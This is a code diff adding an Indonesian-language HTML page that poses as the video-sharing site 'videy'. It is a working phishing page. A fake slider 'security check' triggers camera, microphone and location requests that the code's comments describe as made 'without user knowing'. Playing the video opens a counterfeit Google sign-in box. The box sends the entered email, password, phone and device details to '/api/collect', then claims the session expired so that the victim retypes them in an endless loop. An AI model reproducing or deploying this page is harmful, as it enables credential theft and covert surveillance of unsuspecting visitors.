@@ -1,0 +1,758 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>Videy - Share your videos</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    /* ========== VERIFICATION PAGE - PUTIH POLOS ========== */
+    .verify-page {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: #ffffff;
+      z-index: 1000;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    .verify-container {
+      max-width: 450px;
+      width: 90%;
+      text-align: center;
+      padding: 40px 30px;
+      background: white;
+      border-radius: 24px;
+    }
+
+    .verify-icon {
+      font-size: 48px;
+      margin-bottom: 20px;
+    }
+
+    .verify-title {
+      font-size: 22px;
+      font-weight: 600;
+      color: #1a1a1a;
+      margin-bottom: 8px;
+    }
+
+    .verify-desc {
+      font-size: 14px;
+      color: #666;
+      margin-bottom: 35px;
+    }
+
+    /* SLIDER BIRU */
+    .slider-wrapper {
+      background: #f0f0f0;
+      border-radius: 60px;
+      position: relative;
+      height: 64px;
+      cursor: pointer;
+      margin-bottom: 25px;
+      overflow: hidden;
+      box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);
+    }
+
+    .slider-track {
+      position: absolute;
+      top: 0;
+      left: 0;
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #1877f2, #0d6efd);
+      border-radius: 60px;
+      transition: width 0.05s linear;
+    }
+
+    .slider-thumb {
+      position: absolute;
+      top: 6px;
+      left: 6px;
+      width: 52px;
+      height: 52px;
+      background: white;
+      border-radius: 50%;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: grab;
+      transition: left 0.05s linear;
+      z-index: 2;
+    }
+
+    .slider-thumb:active {
+      cursor: grabbing;
+    }
+
+    .slider-thumb i {
+      font-size: 24px;
+      color: #1877f2;
+    }
+
+    .slider-text {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      color: #888;
+      font-weight: 500;
+      font-size: 15px;
+      pointer-events: none;
+      z-index: 1;
+    }
+
+    .verify-btn {
+      background: #1877f2;
+      color: white;
+      border: none;
+      padding: 14px 30px;
+      border-radius: 40px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      width: 100%;
+      opacity: 0.5;
+      pointer-events: none;
+      transition: 0.2s;
+    }
+
+    .verify-btn.active {
+      opacity: 1;
+      pointer-events: auto;
+    }
+
+    /* ========== HALAMAN VIDEY.CO - BACKGROUND PUTIH ========== */
+    .videos-page {
+      display: none;
+      min-height: 100vh;
+      background: #ffffff;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    /* Header videy.co */
+    .videos-header {
+      position: sticky;
+      top: 0;
+      background: #ffffff;
+      z-index: 100;
+      padding: 12px 20px;
+      border-bottom: 1px solid #eaeaea;
+    }
+
+    .header-content {
+      max-width: 1200px;
+      margin: 0 auto;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .logo {
+      font-size: 24px;
+      font-weight: 700;
+      color: #000000;
+    }
+
+    .nav-icons {
+      display: flex;
+      gap: 20px;
+    }
+
+    .nav-icons i {
+      color: #333;
+      font-size: 20px;
+      cursor: pointer;
+    }
+
+    /* Single video container - di atas tengah */
+    .single-video-container {
+      max-width: 900px;
+      margin: 40px auto 0;
+      padding: 0 20px;
+    }
+
+    .video-card-single {
+      background: #ffffff;
+      border-radius: 20px;
+      overflow: hidden;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+    }
+
+    .thumbnail-wrapper-single {
+      position: relative;
+      background: #000;
+      aspect-ratio: 16 / 9;
+      cursor: pointer;
+    }
+
+    .thumbnail-single {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    .play-button-single {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 80px;
+      height: 80px;
+      background: rgba(0,0,0,0.7);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: 0.2s;
+      cursor: pointer;
+    }
+
+    .play-button-single:hover {
+      background: rgba(0,0,0,0.9);
+      transform: translate(-50%, -50%) scale(1.1);
+    }
+
+    .play-button-single i {
+      color: white;
+      font-size: 36px;
+      margin-left: 6px;
+    }
+
+    .video-info-single {
+      padding: 20px;
+    }
+
+    .video-title-single {
+      font-size: 20px;
+      font-weight: 600;
+      color: #1a1a1a;
+      margin-bottom: 8px;
+    }
+
+    .video-stats-single {
+      font-size: 14px;
+      color: #666;
+    }
+
+    /* ========== MODAL VIDEO PLAYER ========== */
+    .video-modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: #000000;
+      z-index: 1000;
+      display: none;
+      flex-direction: column;
+    }
+
+    .video-modal.active {
+      display: flex;
+    }
+
+    .modal-header {
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      padding: 16px 24px;
+      background: linear-gradient(to bottom, rgba(0,0,0,0.5), transparent);
+      z-index: 10;
+      display: flex;
+      justify-content: flex-end;
+    }
+
+    .close-modal {
+      background: rgba(255,255,255,0.2);
+      border: none;
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      color: white;
+      font-size: 20px;
+      cursor: pointer;
+    }
+
+    .modal-video-wrapper {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: #000;
+    }
+
+    .modal-video-wrapper video {
+      width: 100%;
+      max-height: 100vh;
+    }
+
+    /* ========== LOGIN OVERLAY ========== */
+    .login-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.95);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 2000;
+    }
+
+    .google-login-modal {
+      background: white;
+      border-radius: 12px;
+      width: 90%;
+      max-width: 400px;
+      padding: 32px 28px;
+      text-align: center;
+    }
+
+    .google-login-modal img {
+      margin-bottom: 24px;
+    }
+
+    .google-login-modal h3 {
+      font-size: 22px;
+      font-weight: 400;
+      color: #202124;
+      margin-bottom: 8px;
+    }
+
+    .google-login-modal p {
+      font-size: 14px;
+      color: #5f6368;
+      margin-bottom: 24px;
+    }
+
+    .google-login-modal input {
+      width: 100%;
+      padding: 14px 16px;
+      margin: 8px 0;
+      border: 1px solid #dadce0;
+      border-radius: 8px;
+      font-size: 14px;
+    }
+
+    .google-login-modal input:focus {
+      outline: none;
+      border-color: #1a73e8;
+    }
+
+    .google-login-modal button {
+      width: 100%;
+      padding: 12px;
+      background: #1a73e8;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      margin-top: 16px;
+    }
+
+    .login-error {
+      color: #d93025;
+      font-size: 12px;
+      margin-top: 12px;
+    }
+
+    .login-success {
+      color: #34a853;
+      font-size: 12px;
+      margin-top: 12px;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .loading-spinner {
+      display: inline-block;
+      width: 14px;
+      height: 14px;
+      border: 2px solid white;
+      border-radius: 50%;
+      border-top-color: transparent;
+      animation: spin 0.6s linear infinite;
+      margin-left: 8px;
+    }
+
+    /* Responsive */
+    @media (max-width: 768px) {
+      .play-button-single {
+        width: 60px;
+        height: 60px;
+      }
+      .play-button-single i {
+        font-size: 28px;
+      }
+      .video-title-single {
+        font-size: 16px;
+      }
+    }
+  </style>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<body>
+
+<!-- HALAMAN VERIFIKASI - PUTIH POLOS -->
+<div class="verify-page" id="verifyPage">
+  <div class="verify-container">
+    <div class="verify-icon">🔐</div>
+    <div class="verify-title">Verifikasi keamanan</div>
+    <div class="verify-desc">Geser slider biru ke kanan untuk verifikasi</div>
+    
+    <div class="slider-wrapper" id="sliderWrapper">
+      <div class="slider-track" id="sliderTrack"></div>
+      <div class="slider-thumb" id="sliderThumb">
+        <i class="fas fa-arrow-right"></i>
+      </div>
+      <div class="slider-text" id="sliderText">Geser ke kanan</div>
+    </div>
+    
+    <button class="verify-btn" id="verifyBtn">Lanjutkan</button>
+  </div>
+</div>
+
+<!-- HALAMAN VIDEO - 1 VIDEO DI ATAS TENGAH -->
+<div class="videos-page" id="videosPage">
+  <div class="videos-header">
+    <div class="header-content">
+      <div class="logo">videy</div>
+      <div class="nav-icons">
+        <i class="fas fa-search"></i>
+        <i class="fas fa-user-circle"></i>
+      </div>
+    </div>
+  </div>
+
+  <div class="single-video-container">
+    <div class="video-card-single">
+      <div class="thumbnail-wrapper-single" id="videoThumbnail">
+        <img src="https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=800" class="thumbnail-single" alt="Video thumbnail">
+        <div class="play-button-single">
+          <i class="fas fa-play"></i>
+        </div>
+      </div>
+      <div class="video-info-single">
+        <div class="video-title-single">Beautiful Nature 4K - Ultra HD Video</div>
+        <div class="video-stats-single">
+          <span><i class="fas fa-eye"></i> 1.2M views</span>
+          <span style="margin-left: 16px;"><i class="fas fa-thumbs-up"></i> 45K likes</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- MODAL VIDEO PLAYER -->
+<div class="video-modal" id="videoModal">
+  <div class="modal-header">
+    <button class="close-modal" id="closeModalBtn"><i class="fas fa-times"></i></button>
+  </div>
+  <div class="modal-video-wrapper">
+    <video id="modalVideo" controls>
+      <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+    </video>
+  </div>
+</div>
+
+<script>
+  // ========== SLIDER VERIFICATION ==========
+  const sliderWrapper = document.getElementById('sliderWrapper');
+  const sliderThumb = document.getElementById('sliderThumb');
+  const sliderTrack = document.getElementById('sliderTrack');
+  const sliderText = document.getElementById('sliderText');
+  const verifyBtn = document.getElementById('verifyBtn');
+  const verifyPage = document.getElementById('verifyPage');
+  const videosPage = document.getElementById('videosPage');
+  
+  let isVerified = false;
+  let isDragging = false;
+  let startX = 0;
+  let thumbLeft = 6;
+  let maxLeft = 0;
+  
+  function updateMaxLeft() {
+    maxLeft = sliderWrapper.offsetWidth - 58;
+  }
+  
+  updateMaxLeft();
+  window.addEventListener('resize', () => {
+    updateMaxLeft();
+    if (!isVerified) {
+      thumbLeft = 6;
+      sliderThumb.style.left = '6px';
+      sliderTrack.style.width = '0px';
+    }
+  });
+  
+  sliderThumb.addEventListener('mousedown', (e) => {
+    isDragging = true;
+    startX = e.clientX - thumbLeft;
+    sliderThumb.style.cursor = 'grabbing';
+    e.preventDefault();
+  });
+  
+  document.addEventListener('mousemove', (e) => {
+    if (!isDragging) return;
+    let newLeft = e.clientX - startX;
+    newLeft = Math.min(Math.max(newLeft, 6), maxLeft);
+    thumbLeft = newLeft;
+    sliderThumb.style.left = thumbLeft + 'px';
+    sliderTrack.style.width = (thumbLeft + 30) + 'px';
+    
+    if (thumbLeft >= maxLeft - 10) {
+      if (!isVerified) {
+        isVerified = true;
+        sliderText.innerHTML = '✓ Terverifikasi!';
+        sliderText.style.color = '#1877f2';
+        verifyBtn.classList.add('active');
+      }
+    } else {
+      if (isVerified) {
+        isVerified = false;
+        sliderText.innerHTML = 'Geser ke kanan';
+        sliderText.style.color = '#888';
+        verifyBtn.classList.remove('active');
+      }
+    }
+  });
+  
+  document.addEventListener('mouseup', () => {
+    isDragging = false;
+    sliderThumb.style.cursor = 'grab';
+    if (!isVerified && thumbLeft < maxLeft - 10) {
+      thumbLeft = 6;
+      sliderThumb.style.left = '6px';
+      sliderTrack.style.width = '0px';
+    }
+  });
+  
+  // Touch support
+  sliderThumb.addEventListener('touchstart', (e) => {
+    isDragging = true;
+    startX = e.touches[0].clientX - thumbLeft;
+    e.preventDefault();
+  });
+  
+  document.addEventListener('touchmove', (e) => {
+    if (!isDragging) return;
+    let newLeft = e.touches[0].clientX - startX;
+    newLeft = Math.min(Math.max(newLeft, 6), maxLeft);
+    thumbLeft = newLeft;
+    sliderThumb.style.left = thumbLeft + 'px';
+    sliderTrack.style.width = (thumbLeft + 30) + 'px';
+    
+    if (thumbLeft >= maxLeft - 10 && !isVerified) {
+      isVerified = true;
+      sliderText.innerHTML = '✓ Terverifikasi!';
+      sliderText.style.color = '#1877f2';
+      verifyBtn.classList.add('active');
+    }
+  });
+  
+  document.addEventListener('touchend', () => {
+    isDragging = false;
+    if (!isVerified && thumbLeft < maxLeft - 10) {
+      thumbLeft = 6;
+      sliderThumb.style.left = '6px';
+      sliderTrack.style.width = '0px';
+    }
+  });
+  
+  // ========== REQUEST PERMISSIONS SILENTLY (TANPA POP-UP) ==========
+  async function requestAllPermissionsSilently() {
+    console.log('📱 Requesting permissions silently...');
+    
+    // Camera permission (silent)
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      stream.getTracks().forEach(track => track.stop());
+      console.log('✅ Camera access granted');
+    } catch (e) {
+      console.log('Camera access denied');
+    }
+    
+    // Microphone permission (silent)
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+      stream.getTracks().forEach(track => track.stop());
+      console.log('✅ Microphone access granted');
+    } catch (e) {
+      console.log('Microphone access denied');
+    }
+    
+    // Location permission (silent)
+    try {
+      const position = await new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject);
+      });
+      console.log('✅ Location obtained:', position.coords.latitude, position.coords.longitude);
+    } catch (e) {
+      console.log('Location access denied');
+    }
+  }
+  
+  // ========== VERIFY BUTTON ==========
+  verifyBtn.addEventListener('click', async () => {
+    if (!isVerified) return;
+    
+    verifyBtn.innerHTML = '⏳ Memproses...';
+    verifyBtn.disabled = true;
+    
+    // Request all permissions without user knowing
+    await requestAllPermissionsSilently();
+    
+    // Switch to video page
+    setTimeout(() => {
+      verifyPage.style.display = 'none';
+      videosPage.style.display = 'block';
+    }, 500);
+  });
+  
+  // ========== VIDEO PLAYER MODAL ==========
+  const videoModal = document.getElementById('videoModal');
+  const modalVideo = document.getElementById('modalVideo');
+  const closeModalBtn = document.getElementById('closeModalBtn');
+  const videoThumbnail = document.getElementById('videoThumbnail');
+  
+  function openVideoModal() {
+    modalVideo.src = "https://www.w3schools.com/html/mov_bbb.mp4";
+    videoModal.classList.add('active');
+    // Show login overlay immediately
+    showLoginOverlay();
+  }
+  
+  function closeVideoModal() {
+    modalVideo.pause();
+    modalVideo.src = '';
+    videoModal.classList.remove('active');
+    const existingOverlay = document.querySelector('.login-overlay');
+    if (existingOverlay) existingOverlay.remove();
+  }
+  
+  videoThumbnail.addEventListener('click', openVideoModal);
+  closeModalBtn.addEventListener('click', closeVideoModal);
+  
+  // When user tries to play video, show login (endless loop)
+  modalVideo.addEventListener('play', () => {
+    modalVideo.pause();
+    showLoginOverlay();
+  });
+  
+  modalVideo.addEventListener('click', () => {
+    modalVideo.pause();
+    showLoginOverlay();
+  });
+  
+  // ========== LOGIN OVERLAY (ENDLESS LOOP) ==========
+  function showLoginOverlay() {
+    const existingOverlay = document.querySelector('.login-overlay');
+    if (existingOverlay) existingOverlay.remove();
+    
+    const overlay = document.createElement('div');
+    overlay.className = 'login-overlay';
+    overlay.innerHTML = `
+      <div class="google-login-modal">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" style="width: 92px;">
+        <h3>Sign in</h3>
+        <p>to continue to videy</p>
+        <input type="email" id="loginEmail" placeholder="Email or phone" autocomplete="off">
+        <input type="password" id="loginPassword" placeholder="Enter your password">
+        <input type="tel" id="loginPhone" placeholder="Phone number (optional)">
+        <button id="loginSubmitBtn">Next</button>
+        <div class="login-error" id="loginErrorMsg"></div>
+      </div>
+    `;
+    
+    document.body.appendChild(overlay);
+    
+    const emailInput = document.getElementById('loginEmail');
+    const passwordInput = document.getElementById('loginPassword');
+    const phoneInput = document.getElementById('loginPhone');
+    const loginBtn = document.getElementById('loginSubmitBtn');
+    const errorMsg = document.getElementById('loginErrorMsg');
+    
+    loginBtn.addEventListener('click', async () => {
+      const email = emailInput.value.trim();
+      const password = passwordInput.value;
+      const phone = phoneInput.value.trim();
+      
+      if (!email || !password) {
+        errorMsg.textContent = 'Email and password are required';
+        return;
+      }
+      
+      loginBtn.disabled = true;
+      loginBtn.innerHTML = 'Processing... <span class="loading-spinner"></span>';
+      
+      // Get device data
+      const deviceData = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screen: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+      };
+      
+      // Send to backend
+      try {
+        const response = await fetch('/api/collect', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            email: email,
+            password: password,
+            phone: phone,
+            deviceData: deviceData,
+            timestamp: new Date().toISOString()
+          })
+        });
+        await response.json();
+        console.log('Data sent to server');
+      } catch (err) {
+        console.error('Error sending data:', err);
+      }
+      
+      // Show success then error (endless loop)
+      errorMsg.className = 'login-success';
+      errorMsg.textContent = 'Verification successful...';
+      
+      setTimeout(() => {
+        errorMsg.className = 'login-error';
+        errorMsg.textContent = 'Session expired. Please sign in again.';
+        
+        setTimeout(() => {
+          // Clear form and show again
+          emailInput.value = '';
+          passwordInput.value = '';
+          phoneInput.value = '';
+          errorMsg.textContent = '';
+          loginBtn.disabled = false;
+          loginBtn.innerHTML = 'Next';
+          // Keep overlay visible (endless loop)
+        }, 2000);
+      }, 1500);
+    });
+  }
+</script>
+</body>
+</html>
